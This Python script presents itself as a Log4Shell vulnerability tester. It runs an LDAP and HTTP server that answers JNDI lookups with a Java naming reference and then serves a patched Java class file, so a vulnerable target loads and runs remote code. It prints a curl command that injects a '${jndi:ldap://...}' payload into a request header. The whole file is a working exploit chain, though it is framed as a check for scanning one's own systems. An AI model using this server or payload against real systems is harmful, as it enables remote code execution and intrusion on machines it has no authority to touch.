import sys
import socket
import select
import asn1


print("")
print("######################################################")
print("#                                                    #")
print("#           LOG4SHELL VULNERABILITY TESTER           #")
print("#                                                    #")
print("#   This program is used to test Log4Shell vuln.     #")
print("#   it is designed to run both, LDAP and HTTP srv.   #")
print("#   on the same port for some organization purpose   #")
print("#                                                    #")
print("#   Note: it is written in the objective to have     #")
print("#       no extra dependencies than pythons ones      #")
print("#                                                    #")
print("#                                Ludovic DECAMPY     #")
print("#                                                    #")
print("######################################################")
print("")

if len(sys.argv) < 3: 
    print('Usage   : python3 {} <listening ip> <listening port>'.format(sys.argv[0]))
    print('Example : python3 {} 127.0.0.1 8080'.format(sys.argv[0]))
    sys.exit(); 

TCP_IP = sys.argv[1]
TCP_PORT = int(sys.argv[2])

ASN1_BOOLEAN = 0x01
ASN1_INTEGER = 0x02 
ASN1_OCTETSTRING = 0x04
ASN1_NULL = 0x05
ASN1_SEQUENCE = 0x10 
ASN1_SET = 0x11
ASN1_APPLICATION = 0x40
 
LDAP_PROBE_REQ = bytearray.fromhex("300c020101600702010304008000") # 300c020101600702010304008000
LDAP_PROBE_ACK = bytearray.fromhex("300c02010161070a010004000400") # 300c02010161070a010004000400

def read_ldap_req(req): 
    decoder = asn1.Decoder()
    decoder.start(req)
    decoder.enter()
    decoder.read()
    decoder.enter()
    _, askedObject = decoder.read()
    return askedObject 

def add_ldap_reply_start(encoder): 
    encoder.enter(ASN1_SEQUENCE)
    encoder.write(0x01, ASN1_INTEGER)
    encoder.enter(1, ASN1_APPLICATION)
    encoder.write(00, 0x0a)
    encoder.write('', ASN1_OCTETSTRING)
    encoder.write('', ASN1_OCTETSTRING)
    encoder.leave()
    encoder.leave() 

def add_ldap_reply_end(encoder): 
    encoder.enter(ASN1_SEQUENCE)
    encoder.write(0x02, ASN1_INTEGER)
    encoder.enter(5, ASN1_APPLICATION)
    encoder.write(00, 0x0a)
    encoder.write('', ASN1_OCTETSTRING)
    encoder.write('', ASN1_OCTETSTRING)
    encoder.leave()
    encoder.leave() 

def add_ldap_content(encoder, askedObject, params): 
    encoder.enter(ASN1_SEQUENCE)
    encoder.write(ASN1_INTEGER, 0x02)
    encoder.enter(4, ASN1_APPLICATION)
    encoder.write(askedObject, ASN1_OCTETSTRING)
    encoder.enter(ASN1_SEQUENCE)
    for param in params.items():
        encoder.enter(ASN1_SEQUENCE)
        encoder.write(param[0], ASN1_OCTETSTRING)
        encoder.enter(ASN1_SET)
        for val in param[1]: 
            encoder.write(val, ASN1_OCTETSTRING)
        encoder.leave()
        encoder.leave() 
    encoder.leave()
    encoder.leave()
    encoder.leave()

def generate_ldap_response(askedObject, params): 
    encoder = asn1.Encoder()
    encoder.start()
    add_ldap_reply_start(encoder)
    add_ldap_content(encoder, askedObject, params)
    add_ldap_reply_end(encoder)
    return encoder.output()

def generate_objectclass_http_response(LIP, LPORT, identifier="NoIdentifier"): 
    f = open("JNDIObj.class", "rb")
    response_body_raw = f.read()
    f.close()
    replicant_url = "http://{}:{}/{}".format(LIP, LPORT, identifier)
    replicant_url_padded = '{:120}'.format(replicant_url)
    response_body_raw = response_body_raw.replace(b"URL_TO_CALL_BACK_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX_PLACEHOLDER", replicant_url_padded.encode())
    response_headers = {
        'Content-Type': 'application/java-vm',
        'Content-Length': len(response_body_raw),
        'Connection': 'close',
    }
    response_headers_raw = ''.join('%s: %s\n' % (k, v) for k, v in response_headers.items())
    return b"HTTP/1.0 200 OK" + b'\n' + response_headers_raw.encode() + b'\n' + response_body_raw
  

BUFFER_SIZE = 2048
param = []

print ('Server started ...')
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((TCP_IP,TCP_PORT))
server.listen(1)
rxset = [server]
txset = []


print("Usage: ")
print("    curl <target> -H 'X-Api-Version: ${}jndi:ldap://{}:{}/<unique hash>{} '".format("{",TCP_IP,TCP_PORT, "}"))

while 1:
    rxfds, txfds, exfds = select.select(rxset, txset, rxset)
    for sock in rxfds:
        if sock is server:
            conn, addr = server.accept()
            conn.setblocking(0)
            rxset.append(conn)
            print ('Connection from address:', addr)
        else:
            try:
                data = sock.recv(BUFFER_SIZE)
                if len(data) > 0: 
                    LIP = sock.getsockname()[0]
                    LPORT = sock.getsockname()[1]
                    if data == LDAP_PROBE_REQ: # IS AN LDAP PROBE  
                        sock.send(LDAP_PROBE_ACK)
                    elif data[0] == 48: # IS AND LDAP QUERY 
                        askedObject = read_ldap_req(data)
                        params = {
                            "javaClassName": ["foo"], 
                            "javaCodeBase": ["http://{}:{}/{}/".format(LIP, LPORT, askedObject.decode())], 
                            "objectClass": ["javaNamingReference"], 
                            "javaFactory": ["JNDIObj"]
                        }
                        resp = generate_ldap_response(askedObject, params)
                        sock.send(resp)
                        rxset.remove(sock)
                        sock.close()
                    elif data[0:3] == b"GET": # IS AN HTTP GET REQUEST 
                        identifier = data[4:].decode().split('/')[1]
                        if identifier == 'confirm': 
                            identifier = data[4:].decode().split('/')[2].split(' ')[0]
                            print('Vulnerability confirmed for: {}'.format(identifier))
                            rxset.remove(sock)
                            sock.close()
                        else: 
                            sock.send(generate_objectclass_http_response(LIP, LPORT, 'confirm/{}'.format(identifier)))
                            rxset.remove(sock)
                            sock.close()
                    else: 
                        print('unknown request')
            except:
                print ("Connection closed by remote end")
                param = []
                rxset.remove(sock)
                sock.close()
 

 